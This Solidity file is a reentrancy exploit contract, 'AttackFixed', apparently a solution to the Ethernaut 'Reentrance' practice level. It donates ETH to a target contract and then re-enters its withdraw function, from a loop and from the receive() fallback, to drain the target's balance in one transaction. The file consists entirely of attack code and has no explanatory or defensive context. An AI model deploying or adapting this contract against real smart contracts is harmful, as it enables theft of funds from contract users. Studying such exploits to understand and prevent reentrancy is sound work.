pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}


contract AttackFixed {
    Reentrance public victim;

    constructor(address _victimAddress) {
        victim = Reentrance(_victimAddress);
    }

    // Deposit ETH into victim then withdraw all in one transaction!

    function attack() external payable {
        victim.donate{value: msg.value}(address(this));
        for (uint i = 0; i < 1000; i++) {
            if (victim.balanceOf(address(this)) == 0) break;
            victim.withdraw(victim.balanceOf(address(this)));
        }
    }

    // This function must be payable to handle reentrancy
    receive() external payable {
        if (victim.balanceOf(address(this)) > 0) {
            victim.withdraw(victim.balanceOf(address(this)));
        }
    }

    function attackOnce() external {
        victim.withdraw(victim.balanceOf(address(this)));
    }
}
